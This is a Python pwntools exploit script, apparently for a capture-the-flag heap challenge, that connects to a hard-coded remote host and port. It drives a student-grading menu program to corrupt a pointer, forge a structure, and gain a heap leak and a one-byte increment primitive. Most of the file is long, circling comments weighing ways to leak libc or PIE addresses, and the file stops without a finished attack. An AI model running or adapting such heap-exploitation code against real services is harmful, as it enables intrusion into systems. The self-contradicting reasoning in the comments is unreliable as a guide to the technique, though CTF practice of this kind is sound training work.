from pwn import *
import time
import sys
import re

context.log_level = 'info'
context.arch = 'amd64'

HOST = '39.96.193.120'
PORT = 10016

libc = ELF('./pwn4.so')

def exploit():
    r = remote(HOST, PORT, timeout=30)
    
    data = r.recv(8192)
    r.sendline(b'0')  # teacher
    time.sleep(0.5)
    r.recv(8192)
    
    # Add 3 students
    for i in range(3):
        r.sendline(b'1')
        time.sleep(0.3)
        r.recv(8192)
        r.sendline(b'9')
        time.sleep(0.3)
        r.recv(8192)
    
    # Give score
    r.sendline(b'2')
    time.sleep(1.5)
    r.recv(8192)
    
    # Switch to student role
    r.sendline(b'5')
    time.sleep(0.3)
    r.recv(8192)
    r.sendline(b'1')
    time.sleep(0.3)
    r.recv(8192)
    
    # Change id to 2
    r.sendline(b'6')
    time.sleep(0.3)
    r.recv(8192)
    r.sendline(b'2')
    time.sleep(0.3)
    r.recv(8192)
    
    # Step 1: Option 4 (mode=0): allocate chunk at student2+0x10
    r.sendline(b'4')
    time.sleep(0.3)
    r.recv(8192)
    r.send(b'A' * 0x1f + b'\n')
    time.sleep(0.3)
    r.recv(8192)
    
    # Step 2: Set mode=1
    r.sendline(b'3')
    time.sleep(0.3)
    r.recv(8192)
    
    # Step 3: Option 4 (mode=1): set student2+0x10 low byte to 0x40=64
    # This makes student2+0x10 point to inner2!
    r.sendline(b'4')
    time.sleep(0.3)
    r.recv(8192)
    r.sendline(b'64')
    time.sleep(0.3)
    r.recv(8192)
    
    # Step 4: Set mode=0
    r.sendline(b'3')
    time.sleep(0.3)
    r.recv(8192)
    
    # Step 5: Option 4 (mode=0): write to inner2
    # Craft fake inner data: num_questions=9, score=100, review_ptr=0, review_size=0
    fake_inner = p32(9) + p32(100) + p64(0) + p32(0) + p32(0)
    fake_inner = fake_inner.ljust(0x1f, b'\x00')
    r.sendline(b'4')
    time.sleep(0.3)
    r.recv(8192)
    r.send(fake_inner + b'\n')
    time.sleep(0.3)
    r.recv(8192)
    log.info("Wrote fake inner to inner2 (score=100)")
    
    # Step 6: Pray! (should get PIE leak + arbitrary add 1)
    r.sendline(b'2')
    time.sleep(1)
    data = r.recv(4096)
    log.info(f"Pray result: {data[:500]}")
    
    if b'reward' not in data:
        log.error("Failed to get reward!")
        r.close()
        return
    
    log.success("Got the reward! Score > 89!")
    
    # Parse the leaked address
    # "Good Job! Here is your reward! %p\n"
    # The address is the student struct pointer
    match = re.search(rb'reward! (0x[0-9a-f]+)', data)
    if match:
        pie_leak = int(match.group(1), 16)
        log.info(f"PIE leak (student struct): {hex(pie_leak)}")
    else:
        # Try to find the address in binary data
        for i in range(len(data)-7):
            try:
                val = u64(data[i:i+8])
                if 0x555555000000 < val < 0x565556000000:
                    pie_leak = val
                    log.info(f"Potential PIE address at offset {i}: {hex(val)}")
                    break
            except:
                pass
    
    # Calculate PIE base
    # The leaked address is student2's address
    # student2 data = PIE_base + 0x5030 + some_offset
    # Actually, the leaked address is the student struct pointer
    # From the pray function: printf("Good Job! Here is your reward! %p\n", student_ptr)
    # student_ptr = student_array[student_id]
    # student2 is at PIE_base + offset
    
    # Let me check: in the binary, student_array is at 0x5080
    # student2 = student_array[2] = *(0x5080 + 16)
    # The leaked address is the value stored in student_array[2]
    # This is a heap address, not a PIE address!
    
    # Wait, the pray function leaks student_ptr, which is a heap address!
    # printf("Good Job! Here is your reward! %p\n", student_ptr)
    # student_ptr is the student struct pointer (heap address)
    
    # So we get a heap leak, not a PIE leak!
    heap_leak = pie_leak
    log.info(f"Heap leak: {hex(heap_leak)}")
    
    # Now we also get "add 1 to wherever you want! addr: "
    # We can add 1 to any address!
    # But we can only add 1, which is very limited...
    
    # Let me think about what to do with:
    # 1. Heap address leak
    # 2. Arbitrary add 1 primitive
    
    # With the heap address, we can calculate:
    # - inner2 address = heap_leak + 0x30 (student2 + 0x30)
    # - option4_chunk address = heap_leak + 0x50 (student2 + 0x50)
    # - student_array address = PIE_base + 0x5080
    
    # But we still need PIE base and libc base!
    
    # Can we use the arbitrary add 1 to leak more?
    # If we add 1 to a specific byte, we might be able to change
    # a pointer to point to a GOT entry, then read through it
    
    # But we need to know the PIE base first!
    
    # Wait! The heap address can help us calculate PIE base!
    # If we know the heap base, we can calculate where student_array is
    # But student_array is in the BSS section, which is at PIE_base + offset
    # The heap is at a different location (mmap'd)
    
    # So heap address doesn't directly give us PIE base...
    
    # But! We can use the arbitrary add 1 to modify student_array entries!
    # student_array is at PIE_base + 0x5080
    # If we add 1 to student_array[0], we change the pointer by 1
    # This might allow us to read adjacent memory
    
    # Actually, let me reconsider the pray function output
    # It says "Good Job! Here is your reward! %p"
    # What exactly is the %p argument?
    
    # From the disassembly:
    # 0x1cd5: mov rsi, [rbp - 0x28]  ; student_ptr
    # 0x1cd9: lea rdi, [rip + 0x1698]  ; "Good Job! Here is your reward! %p\n"
    # 0x1ce0: call printf
    
    # So the leaked value is student_ptr = student_array[student_id]
    # This is a heap address
    
    # But wait! Let me check what [rbp - 0x28] contains
    # In the pray function:
    # 0x1c89: mov rax, [rdx + rax]     ; student_array[student_id]
    # 0x1c8d: mov [rbp - 0x28], rax    ; save student_ptr
    
    # So [rbp - 0x28] = student_array[student_id] = student struct pointer
    # This is indeed a heap address
    
    # With the heap address, we can:
    # 1. Calculate inner2 address = heap_leak + 0x30
    # 2. Calculate option4_chunk address = heap_leak + 0x50
    # 3. Use option 4 to write to inner2 and set review_ptr to a known address
    # 4. Use write review to write to that address
    
    # But we still need libc base for system() and "/bin/sh"!
    
    # Can we leak libc through the heap?
    # If we can read the fd/bk pointers of a freed chunk in unsorted bin...
    # But we need to free a large chunk first!
    
    # Let me think about this differently:
    # We have:
    # 1. Heap address leak
    # 2. Arbitrary add 1 (one time only, reward_gained = 1 after)
    # 3. Option 4 can write to any address we can reach through student+0x10
    # 4. Write review can write to review_ptr
    
    # Plan:
    # 1. Use heap leak to calculate inner2 address
    # 2. Use option 4 to modify inner2->review_ptr to point to student_array
    # 3. Use write review to overwrite student_array[0] with a GOT address
    # 4. Use pray on student 0 to leak the GOT entry (libc address!)
    
    # But wait, pray checks score > 89 for student 0
    # Student 0's score is 0-89, so pray would just show review
    # If we overwrite student_array[0] with a GOT address,
    # then student_array[0]->inner would be the value at GOT[0]
    # This might not be a valid pointer...
    
    # Let me think of a better plan:
    # 1. Use heap leak to calculate addresses
    # 2. Use option 4 to modify inner2->review_ptr
    # 3. Use write review to write a fake inner struct at review_ptr
    # 4. Modify student_array[0] to point to a fake student with fake inner
    # 5. The fake inner has score > 89
    # 6. Pray on student 0 to get another reward
    
    # This is getting complicated. Let me try a simpler approach.
    
    # Simpler plan:
    # 1. We have heap leak
    # 2. Use option 4 to write to inner2 and set review_ptr to point to GOT
    # 3. Use write review to read from GOT (but write review writes, not reads!)
    # 4. Use pray to output review content (which is GOT entry = libc address!)
    
    # Wait! Pray with score <= 89 does: write(1, review_ptr, review_size)
    # If review_ptr points to GOT, it outputs the GOT entry = libc address!
    
    # But we need score <= 89 for this, and student 2's score is now 100!
    # We need to use a different student (student 0 or 1) for the leak
    
    # Let me modify the plan:
    # 1. Use heap leak to calculate inner0 address
    # 2. Use option 4 to modify inner0->review_ptr to point to GOT
    # 3. Use pray on student 0 (score <= 89) to output GOT entry
    
    # But option 4 operates on student 2 (current student_id = 2)
    # We need to change student_id to 0 first!
    
    # Actually, option 4 uses student_id from the function parameter
    # And the student_id is stored in [rbp-0x20] in the student menu
    # We can change it using option 6 (change id)
    
    # But after changing id, we lose the ability to modify student2+0x10
    # Because option 4 now operates on student 0
    
    # Hmm, let me think about this more carefully...
    
    # Actually, we can use the "add 1" primitive from the pray reward!
    # We can add 1 to any address!
    # If we add 1 to a specific byte in student0's inner struct,
    # we can modify review_ptr!
    
    # But adding 1 only changes 1 byte by 1...
    # We need to change 8 bytes to a specific value
    
    # Unless we can call pray multiple times!
    # But reward_gained = 1 after the first reward
    # So we can only get the reward once per student
    
    # But we have 3 students! If we modify all 3 students' scores to > 89,
    # we can get 3 rewards = 3 address leaks + 3 arbitrary add 1s!
    
    # Let me modify the plan:
    # 1. Modify student 2's score to 100 (already done)
    # 2. Pray on student 2 -> heap leak + add 1
    # 3. Modify student 0's score to 100 (using option 4)
    # 4. Pray on student 0 -> heap leak + add 1
    # 5. Modify student 1's score to 100
    # 6. Pray on student 1 -> heap leak + add 1
    
    # But we can only modify student 2's inner (through option 4)
    # Because option 4 operates on the current student_id
    
    # We need to change student_id to modify other students
    
    # Wait! After getting the reward from student 2,
    # we can change student_id to 0 and use option 4 on student 0
    # But option 4 on student 0 would allocate a new chunk at student0+0x10
    # Then we need to set mode=1, use option 4 to set low byte, etc.
    
    # This is the same process as for student 2!
    # But the heap layout is different now (more chunks allocated)
    
    # Let me simplify: use the heap leak to calculate all addresses,
    # then use option 4 to modify inner0 and inner1
    
    # For now, let me just use the "add 1" primitive wisely
    # and try to get a libc leak
    
    # The "add 1" primitive: *atol(input) += 1
    # We can add 1 to any byte at any address
    
    # If we add 1 to the least significant byte of inner0->review_ptr,
    # and inner0->review_ptr was 0 (calloc), it becomes 1
    # Address 1 is invalid, so this doesn't help
    
    # What if we add 1 to a GOT entry?
    # GOT entries contain libc function addresses
    # Adding 1 would change the address slightly
    # But we can't read the GOT entry...
    
    # What if we add 1 to student0+0x10 (field_0x10)?
    # student0+0x10 is initially 0
    # Adding 1 makes it 1
    # Then option 4 mode=0 would read(0, 1, 0x20) -> crash!
    
    # What if we add 1 to student0+0x18 (mode)?
    # mode is initially 0
    # Adding 1 makes it 1
    # Then option 4 would be in mode=1 (score input mode)
    
    # Hmm, this doesn't directly help either
    
    # Let me think about what address to add 1 to...
    # 
    # Actually, the key insight is: we have a heap address leak!
    # With the heap address, we can calculate the address of
    # student_array (which is in BSS, at PIE_base + 0x5080)
    # 
    # But we don't know PIE_base!
    # 
    # However, we can use the "add 1" primitive to modify
    # a specific byte and observe the effect
    # 
    # Or... we can use the heap address to calculate
    # where student0's inner struct is, and modify it
    # using option 4
    
    # Let me calculate:
    # heap_leak = student2 data address
    # student0 data = heap_leak - 0x60 (3 students * 0x50 each = 0x90? no)
    # 
    # student0 data = heap_leak - 0x50 (student2 - student0 = 2 * 0x50 = 0xa0? no)
    # 
    # Let me recalculate:
    # student0 data = heap+0x270
    # student1 data = heap+0x2c0
    # student2 data = heap+0x310
    # 
    # student2 - student0 = 0x310 - 0x270 = 0xa0
    # student2 - student1 = 0x310 - 0x2c0 = 0x50
    # 
    # inner0 data = heap+0x2a0
    # inner1 data = heap+0x2f0
    # inner2 data = heap+0x340
    # 
    # So:
    # inner0 = heap_leak - 0x310 + 0x2a0 = heap_leak - 0x70
    # inner1 = heap_leak - 0x310 + 0x2f0 = heap_leak - 0x20
    # inner2 = heap_leak - 0x310 + 0x340 = heap_leak + 0x30
    
    # Now, with the heap leak, we can calculate inner0 and inner1 addresses!
    # Then we can use option 4 to modify them!
    
    # But wait, option 4 operates on the current student_id
    # And we need to change student_id to 0 or 1
    # And then use option 4 on that student
    
    # The problem is: option 4 on student 0 would allocate a new chunk
    # at student0+0x10, which changes the heap layout
    
    # Let me try a different approach:
    # Use the "add 1" primitive to modify inner0->review_ptr
    # Then use write review to set up a fake structure
    # Then use pray to leak libc
    
    # But inner0->review_ptr is 0 (calloc)
    # Adding 1 makes it 1, which is invalid
    
    # What if we add 1 to inner0->review_ptr multiple times?
    # But we only have 1 "add 1" per student (3 total)
    
    # OK, let me try yet another approach:
    # Use the heap leak + option 4 to directly write to inner0
    # and set review_ptr to a GOT entry
    # Then use pray on student 0 to leak the GOT entry
    
    # Step 1: Change student_id to 0
    # Step 2: Use option 4 (mode=0) to allocate chunk at student0+0x10
    # Step 3: Use option 3 to set mode=1
    # Step 4: Use option 4 (mode=1) to set student0+0x10 low byte
    #   to point to inner0
    # Step 5: Use option 3 to set mode=0
    # Step 6: Use option 4 (mode=0) to write to inner0
    #   Set review_ptr to a GOT entry address
    # Step 7: Use pray on student 0 to output GOT entry
    
    # But we need to know the GOT entry address!
    # GOT is at PIE_base + offset, and we don't know PIE_base!
    
    # Hmm, but we know the heap address...
    # Can we put a fake GOT entry on the heap?
    
    # Actually, let me reconsider:
    # We don't need to leak libc through GOT
    # We can leak libc through unsorted bin!
    
    # If we free a large chunk, it goes to unsorted bin
    # The fd/bk pointers point to main_arena (in libc)
    # If we can then read the fd/bk pointers, we get libc base
    
    # But earlier, tcache was consuming the freed chunks...
    # And we can only free 3 students (call_parent_count = 3)
    
    # Wait, we already used 0 call_parent (we didn't call parent yet)
    # So we can still call parent 3 times!
    
    # Plan:
    # 1. Write a large review (0x3ff) for student 0
    # 2. Call parent for student 0 (free review -> unsorted bin)
    # 3. Add new student (calloc from tcache, not unsorted bin)
    # 4. Write review for new student (malloc from unsorted bin!)
    # 5. Read review content -> leak libc!
    
    # But we need to fill tcache first to prevent calloc from
    # consuming the unsorted bin chunk!
    
    # Actually, the review chunk is 0x410 bytes
    # tcache[0x410] can hold 7 entries
    # We only free 1 review, so it goes to tcache[0x410]
    # Not unsorted bin!
    
    # To get the chunk into unsorted bin, we need to fill
    # tcache[0x410] with 7 entries first
    # But we can only create 7 students (0-6) and each has 1 review
    # And we can only call parent 3 times
    
    # So we can only free 3 reviews -> tcache[0x410] has 3 entries
    # Not enough to fill tcache (needs 7)
    
    # So the review chunk always goes to tcache, not unsorted bin!
    # And tcache doesn't have fd/bk pointers that point to libc!
    
    # We need a different way to leak libc...
    
    # Idea: Use the heap leak to calculate the address of
    # student_array (in BSS), then use option 4 to write
    # a pointer to GOT in student_array, then use pray to leak
    
    # But we don't know PIE_base, so we can't calculate BSS address!
    
    # Wait! The heap leak gives us a heap address
    # Can we find PIE_base from the heap?
    # 
    # In glibc, the heap is allocated via mmap or brk
    # The heap address is independent of PIE base
    # So we can't calculate PIE base from heap address
    
    # But! The student_array is at PIE_base + 0x5080
    # If we can find a pointer to student_array on the heap,
    # we can calculate PIE base!
    
    # Is there a pointer to student_array on the heap?
    # The student_array is a global variable in BSS
    # It's not stored on the heap
    
    # But the code accesses student_array using RIP-relative addressing
    # lea rax, [rip + 0x3aae]  ; student_array
    # This doesn't store the address on the heap
    
    # So we can't find PIE base from the heap...
    
    # Let me think of another way to leak PIE base or libc base...
    
    # Actually, wait! The "add 1" primitive can be used creatively!
    # If we add 1 to the least significant byte of a pointer,
    # we shift it by 1 byte
    # If the pointer was pointing to a specific location,
    # after adding 1, it points to location+1
    
    # For example, if inner0->review_ptr = 0
    # Adding 1 to the address of inner0->review_ptr makes it 1
    # But address 1 is invalid
    
    # What if we add 1 to a different field?
    # inner0->num_questions is at inner0+0x00
    # inner0->score is at inner0+0x04
    # inner0->review_ptr is at inner0+0x08
    # inner0->review_size is at inner0+0x10
    
    # If we add 1 to inner0->review_size (at inner0+0x10),
    # review_size becomes 1
    # Then if review_ptr is also set, pray would output 1 byte from review_ptr
    
    # But review_ptr is 0...
    
    # OK I think the key issue is that we need PIE base to calculate
    # GOT addresses, and we need libc base for system()
    
    # Let me try to use the heap leak differently:
    # 1. Use option 4 to modify student0's inner struct
    # 2. Set review_ptr to point to student2's inner struct
    # 3. Use write review to write a fake inner struct at student2's inner
    # 4. The fake inner has review_ptr pointing to a heap address
    #    that contains a libc address (from a freed chunk)
    
    # Actually, let me try to leak libc through a different method:
    # Use the "write review" function with an existing review
    # to overwrite the fd pointer of a freed tcache chunk
    
    # When a chunk is in tcache, its fd pointer points to the next entry
    # or NULL if it's the last entry
    # If we can overwrite the fd pointer to point to a GOT entry,
    # then the next malloc from that tcache bin would return
    # the GOT entry address
    # Then we could read/write the GOT entry!
    
    # But this requires precise heap manipulation...
    
    # Let me try a simpler approach first:
    # Just use the "add 1" primitive to modify the program's behavior
    # and see if we can get more information
    
    # For now, let me just use the "add 1" on a specific address
    # and continue the exploit from there
    
    # The "add 1" prompt: "add 1 to wherever you want! addr: "
    # We input an address, and *addr += 1
    
    # Let me add 1 to inner0->review_size (to make it non-zero)
    # inner0 address = heap_leak - 0x70
    # inner0->review_size = inner0 + 0x10 = heap_leak - 0x60
    
    # Actually, let me first figure out what to do with the "add 1"
    # by trying to set up a libc leak
    
    # Plan: 
    # 1. Use "add 1" to modify call_parent_count
    #    This allows us to call parent more times
    # 2. Free more students to fill tcache
    # 3. Eventually get chunks into unsorted bin
    # 4. Leak libc from unsorted bin
    
    # call_parent_count is at PIE_base + 0x5014
    # We don't know PIE_base...
    
    # But wait! We know the heap address!
    # And the heap is mapped at a specific offset from the program
    # Actually no, the heap is at a random address
    
    # Let me try another approach:
    # Use "add 1" to modify the student_count variable
    # student_count is at PIE_base + 0x503c
    # Again, we don't know PIE_base
    
    # Hmm, it seems like we're stuck without PIE base...
    
    # Wait! Let me re-read the pray function output more carefully
    # printf("Good Job! Here is your reward! %p\n", student_ptr)
    # student_ptr is student_array[student_id]
    # This is a HEAP address
    
    # But the "add 1" primitive asks for an address
    # We can input ANY address, including PIE-relative addresses!
    # We just need to know the absolute address
    
    # The problem is we don't know PIE base...
    # Unless we can calculate it from the heap address!
    
    # In Linux, the heap is typically at a fixed offset from the program
    # when ASLR is off. But with ASLR, they're independent.
    
    # However! There might be pointers on the heap that point to BSS
    # For example, if any function stores a pointer to a global variable
    # on the stack, and the stack is near the heap...
    # No, the stack is at a different location
    
    # Let me try to find PIE base by looking at the heap more carefully
    # The heap might contain pointers to BSS or code sections
    
    # Actually, I just realized something!
    # The custom_read function (0x131a) is called in the pray function
    # custom_read(0, buf, 0x10) -> buf[0x10] = 0xc3
    # buf is on the stack!
    # So buf[0x10] = 0xc3 overwrites a stack byte with RET instruction!
    
    # But this doesn't help with leaking...
    
    # Let me try a completely different approach:
    # Use the "add 1" to modify the low byte of student0+0x10
    # to a non-zero value, then use option 4 mode=0 to write
    # to that address
    
    # student0+0x10 is initially 0
    # Adding 1 makes it 1
    # Then option 4 mode=0 would read(0, 1, 0x20) -> crash!
    
    # This doesn't work either...
    
    # OK let me try to use the "add 1" on the heap
    # to modify a tcache chunk's fd pointer
    
    # When a chunk is freed to tcache, its fd points to the next entry
    # If we add 1 to the fd pointer, it shifts by 1 byte
    # This might cause the next malloc to return a shifted address
    # Which could be useful for leaking
    
    # But we need to know which chunks are in tcache
    # and their addresses
    
    # Actually, let me just try to use the "add 1" on
    # a specific address and see what happens
    
    # For now, let me input the heap_leak address (student2)
    # Adding 1 to student2[0] would change the inner_ptr low byte
    # This might cause student2->inner to point to a different location
    
    # Let me try adding 1 to inner2+0x04 (score field)
    # inner2 = heap_leak + 0x30
    # inner2+0x04 = heap_leak + 0x34
    # Adding 1 to the byte at heap_leak + 0x34 would change score from 100 to 101
    # But score is already > 89, so this doesn't help
    
    # Let me try adding 1 to inner0+0x08 (review_ptr low byte)
    # inner0 = heap_leak - 0x70
    # inner0+0x08 = heap_leak - 0x68
    # Adding 1 makes review_ptr = 1 (invalid)
    
    # This is not useful...
    
    # Let me try to think about what addresses we CAN calculate:
    # 1. heap_leak (student2 data address)
    # 2. inner0 = heap_leak - 0x70
    # 3. inner1 = heap_leak - 0x20
    # 4. inner2 = heap_leak + 0x30
    # 5. student0 = heap_leak - 0xa0
    # 6. student1 = heap_leak - 0x50
    # 7. option4_chunk = heap_leak + 0x50
    
    # All of these are heap addresses
    # We can't calculate PIE or libc addresses from them
    
    # Unless... we can find a pointer to PIE/libc on the heap!
    
    # Let me check: does the heap contain any libc or PIE pointers?
    # - The tcache_perthread_struct is at the beginning of the heap
    # - It doesn't contain libc/PIE pointers
    # - The student structs contain inner_ptr (heap address)
    # - The inner structs contain review_ptr (heap address or NULL)
    # - No libc/PIE pointers on the heap!
    
    # So we can't leak PIE or libc from the heap directly...
    
    # We need to find another way!
    
    # Idea: Use the "add 1" to modify the return address on the stack!
    # But we don't know the stack address...
    
    # Idea: Use the "add 1" to modify the GOT entry!
    # But we don't know PIE base, so we can't calculate GOT address
    
    # Idea: Use the "add 1" to modify __free_hook!
    # But we don't know libc base, so we can't calculate __free_hook address
    
    # We're stuck! We need either PIE base or libc base!
    
    # Wait! Let me re-read the pray function more carefully
    # Maybe there's another way to leak addresses
    
    # Pray function:
    # 1. Check reward_gained
    # 2. Check score > 89
    # 3. If yes: leak address + add 1 + set reward_gained = 1
    # 4. If no: check review_ptr, output review content
    
    # The leak in step 3 is: printf("reward! %p", student_ptr)
    # student_ptr is a heap address
    
    # But what if we can make student_ptr point to something else?
    # student_ptr = student_array[student_id]
    # If we can modify student_array[student_id] to point to GOT,
    # then the leak would be a GOT address!
    
    # But student_array is in BSS (PIE_base + 0x5080)
    # We don't know PIE_base!
    
    # UNLESS... we can calculate PIE_base from the heap!
    
    # In some cases, the program stores PIE addresses on the heap
    # For example, if a function pointer is stored in a struct
    
    # Let me check: does the student struct or inner struct
    # contain any function pointers or PIE addresses?
    
    # student_struct: inner_ptr, padding, field_0x10, mode, reward_gained
    # inner_struct: num_questions, score, review_ptr, review_size
    # No function pointers or PIE addresses!
    
    # OK, I think we need to use a different approach entirely.
    # Let me try to use the "write review" function to create
    # a review that contains pointers, then use "call parent" to free it,
    # then use the freed chunk's fd/bk to leak libc
    
    # But as we discussed, tcache doesn't have useful fd/bk pointers
    
    # Unless we can overflow the tcache count!
    # If we free more than 7 chunks of the same size,
    # the 8th chunk goes to unsorted bin!
    
    # But we can only create 7 students and free 3...
    
    # Wait! What about the option4_chunk?
    # It's 0x30 bytes, and it's not freed when the student is freed!
    # If we can free it somehow...
    
    # Actually, the option4_chunk is not tracked by the program
    # It's allocated via calloc in option 4, but never freed
    # So it's a memory leak
    
    # Hmm, let me try yet another approach:
    # Use the "add 1" to modify the tcache count
    # If we set tcache[0x410] count to 7,
    # then the next free of a 0x410 chunk goes to unsorted bin!
    
    # tcache_perthread_struct is at heap+0x10 (data at heap+0x20)
    # counts[0] = tcache[0x20] count (at heap+0x20)
    # counts[1] = tcache[0x30] count (at heap+0x22)
    # ...
    # counts[64] = tcache[0x420] count (at heap+0x20 + 64*2 = heap+0xa0)
    
    # Wait, the counts are uint16_t, so each is 2 bytes
    # counts[i] is at heap+0x20 + i*2
    # For 0x410 chunk: i = (0x410 - 0x20) / 0x10 = 63
    # counts[63] is at heap+0x20 + 63*2 = heap+0x9e
    
    # If we add 1 to heap+0x9e, we increment the count by 1
    # But the count is 2 bytes, so adding 1 to the low byte
    # might not be what we want
    
    # Actually, the "add 1" primitive does: *addr += 1
    # Where addr is the byte address we input
    # So it adds 1 to a single byte
    
    # If counts[63] = 0 (no 0x410 chunks in tcache)
    # Adding 1 to the low byte makes it 1
    # This means tcache thinks there's 1 entry for 0x410
    # But there isn't! This corrupts tcache!
    
    # When we then free a 0x410 chunk, tcache thinks it already has 1 entry
    # So it adds the new entry, making count = 2
    # But the entries list is corrupted!
    
    # This might cause malloc to return a fake chunk!
    # Which we could use to leak or write!
    
    # But this is very complex and unreliable...
    
    # Let me try the simplest possible approach:
    # Just use the "add 1" on the address of student_array[0]
    # (which we don't know) and hope for the best
    
    # Actually, I just realized: we can calculate student_array address
    # if we know PIE base. And PIE base can be calculated from
    # any code pointer.
    
    # Is there a code pointer on the heap? Let me check...
    # The heap contains:
    # - tcache_perthread_struct (no code pointers)
    # - student structs (inner_ptr = heap address)
    # - inner structs (review_ptr = heap address or NULL)
    # - option4_chunk (our data)
    # - review chunks (our data)
    
    # No code pointers on the heap!
    
    # But wait! What about the stack?
    # The stack contains return addresses (code pointers)!
    # If we can read the stack, we can leak PIE base!
    
    # Can we read the stack?
    # The "add 1" primitive can modify any address
    # But we can't read arbitrary addresses
    
    # Unless... we use option 4 to write to a specific address
    # and then use pray to read from that address
    
    # If we set inner0->review_ptr to a stack address,
    # then pray would output the stack content!
    # But we don't know the stack address...
    
    # However, there's a known technique to find the stack:
    # The environ variable in libc points to the stack!
    # But we don't know libc base...
    
    # We're going in circles. Let me try a completely different approach.
    
    # NEW IDEA: Use the "add 1" primitive to modify the program's
    # behavior in a way that leaks more information
    
    # Specifically, add 1 to the "call_parent_count" variable
    # This would allow us to call parent more times
    # Then we can free more students and get more chunks into tcache/unsorted bin
    
    # But we don't know where call_parent_count is (PIE_base + 0x5014)
    
    # WAIT! I just had an idea!
    # The leaked heap address is student2's address
    # student2 is stored in student_array[2]
    # student_array is at PIE_base + 0x5080
    # 
    # If we can find student_array's address on the heap or stack,
    # we can calculate PIE base!
    # 
    # But student_array is accessed via RIP-relative addressing
    # Its address is not stored anywhere on the heap
    
    # Hmm, but what about the .got.plt section?
    # It contains pointers to libc functions
    # If we can read .got.plt, we get libc base!
    
    # But .got.plt is at PIE_base + offset, and we don't know PIE_base
    
    # OK, I think the key insight I'm missing is:
    # How to get PIE base from the heap leak
    
    # Let me check if there are any PIE addresses stored in the
    # heap metadata (chunk headers, etc.)
    
    # Chunk headers contain: prev_size and size
    # These are just sizes, not pointers
    # Freed chunks contain fd/bk pointers (for unsorted bin)
    # or fd pointer (for tcache/fastbin)
    # These are heap addresses, not PIE addresses
    
    # So there are NO PIE addresses on the heap!
    # We cannot leak PIE base from the heap!
    
    # This means we need to find another way to leak PIE base
    # or find a way to exploit without knowing PIE base
    
    # IDEA: Partial overwrite!
    # We know the heap address, and we know that student_array
    # is at PIE_base + 0x5080
    # If we can partially overwrite a student_array entry,
    # we might be able to redirect it to a useful location
    
    # But we need to know at least the page-aligned base of PIE
    # to calculate student_array's address
    
    # In Linux with ASLR, PIE base is random but page-aligned
    # The heap base is also random but page-aligned
    # They're independent, so we can't calculate one from the other
    
    # I'm stuck. Let me try to look at this from a different angle.
    # Maybe there's a simpler vulnerability I'm missing.
    
    # Let me re-read the program strings:
    # "Good Job! Here is your reward! %p" - leaks student_ptr (heap)
    # "add 1 to wherever you want! addr: " - arbitrary add 1
    # "enter your pray score: 0 to 100" - option 4 mode=1
    # "enter your mode!" - option 4 mode=0
    # "please watch carefully :)" - write review existing
    # "never pray again!" - pray limit?
    # "RUA alien?" - invalid student id
    
    # Wait, "never pray again!" - is there a pray limit?
    # Let me check the pray function again...
    
    # Actually, "never pray again!" might be from a different context
    # Let me check the string at 0x3396
    
    # From earlier analysis: 0x3396 = 'never pray again!'
    # This might be output when mode=1 and the student has already prayed
    
    # Let me re-examine option 4 (0x1b05) more carefully
    # Maybe there's a different branch I missed
    
    # For now, let me just proceed with the exploit
    # and use the "add 1" on a calculated heap address
    
    # I'll add 1 to inner0->review_ptr (make it non-zero)
    # Then use write review to set review_ptr to a useful address
    # Then use pray to leak
    
    # But inner0->review_ptr = 0, adding 1 makes it 1 (invalid)
    # We need to set it to a valid address
    
    # What if we add 1 to the SECOND byte of inner0->review_ptr?
    # inner0->review_ptr is at inner0+0x08
    # The second byte is at inner0+0x09
    # Adding 1 to inner0+0x09 would make review_ptr = 0x100
    # Address 0x100 is still invalid...
    
    # What about adding 1 to a higher byte?
    # inner0+0x0a = third byte -> review_ptr = 0x10000
    # Still invalid...
    
    # We need review_ptr to be a valid mapped address
    # Like a heap address or GOT address
    
    # If we could set review_ptr = inner0 address (heap address),
    # then write review would write to inner0 itself!
    # And pray would output inner0's content!
    
    # But how? We need to know inner0's absolute address
    # inner0 = heap_leak - 0x70 (we calculated this!)
    
    # So if we use the "add 1" primitive on inner0+0x08 (review_ptr low byte),
    # we set review_ptr = 1 (not useful)
    
    # But if we could write the full 8-byte address...
    # The "add 1" only adds 1 to a single byte
    
    # We need 8 adds to set a full pointer!
    # But we only have 1 "add 1" (reward_gained = 1 after use)
    
    # Unless we can get more rewards by modifying other students' scores!
    
    # Plan:
    # 1. Got reward from student 2 (heap leak + add 1)
    # 2. Use add 1 on... hmm, what?
    # 3. Change student_id to 0
    # 4. Use option 4 to modify student0's inner (set score > 89)
    # 5. Pray on student 0 (another heap leak + add 1)
    # 6. Change student_id to 1
    # 7. Use option 4 to modify student1's inner (set score > 89)
    # 8. Pray on student 1 (another heap leak + add 1)
    # 9. Now we have 3 "add 1"s!
    
    # But each "add 1" only modifies 1 byte
    # We need 8 bytes for a full pointer
    # 3 "add 1"s can only modify 3 bytes
    
    # Unless we use option 4 to write the pointer!
    # Option 4 mode=0 can write 0x20 bytes to student+0x10
    # If student+0x10 points to inner, we can set review_ptr!
    
    # YES! This is the key!
    # 1. Use option 4 on student 0 to write to inner0
    # 2. Set review_ptr to a known address (like inner0 itself)
    # 3. Use write review to write data to inner0
    # 4. Or use pray to output inner0's content
    
    # But we need to know inner0's address!
    # inner0 = heap_leak - 0x70
    
    # So the plan is:
    # 1. Use "add 1" on something useful (or just skip it for now)
    # 2. Change student_id to 0
    # 3. Use option 4 on student 0 to modify inner0
    # 4. Set review_ptr = inner0 address (calculated from heap_leak)
    # 5. Use write review to write to inner0 (self-referencing)
    # 6. Or use pray to output inner0 content (but score needs to be <= 89)
    
    # Wait, for pray to output review content, score must be <= 89
    # But we want to set score > 89 to get the reward
    # These are contradictory!
    
    # Unless we use different students for different purposes:
    # - Student 0: score <= 89, used for leaking via pray (review output)
    # - Student 2: score > 89, used for reward (heap leak + add 1)
    
    # Plan:
    # 1. Student 2: already has score > 89, got reward
    # 2. Use "add 1" on something (will decide later)
    # 3. Change to student 0
    # 4. Use option 4 to modify inner0->review_ptr
    #    Set review_ptr to a GOT entry address
    #    But we don't know PIE base!
    # 5. Use option 4 to modify inner0->review_ptr
    #    Set review_ptr to a heap address that contains libc pointers
    #    But there are no libc pointers on the heap!
    
    # I keep going in circles...
    
    # Let me try a COMPLETELY different approach:
    # Forget about leaking libc for now
    # Just use the heap leak + option 4 to get arbitrary write
    # Then overwrite something useful
    
    # With heap leak, we can:
    # 1. Calculate student0's address
    # 2. Use option 4 to modify student0's inner_ptr
    # 3. Make inner_ptr point to a fake inner struct on the heap
    # 4. The fake inner has review_ptr pointing to student_array
    # 5. Use write review to overwrite student_array entries
